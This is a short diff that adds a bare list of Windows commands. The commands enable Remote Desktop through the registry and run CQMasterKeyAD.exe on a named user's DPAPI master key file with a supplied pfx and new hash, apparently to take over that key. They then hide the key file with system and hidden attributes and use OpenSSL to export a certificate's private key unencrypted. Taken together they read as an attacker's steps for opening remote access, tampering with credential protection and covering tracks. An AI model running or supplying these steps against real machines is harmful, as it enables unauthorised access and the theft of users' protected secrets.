@@ -1,0 +1,9 @@
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d "0" /f
+
+CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
+
+attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
+
+openssl pkcs12 -in DMK.pfx -out temp.pem -nodes
+
+openssl pkcs12 -export -out DMK2.pfx -in temp.pem
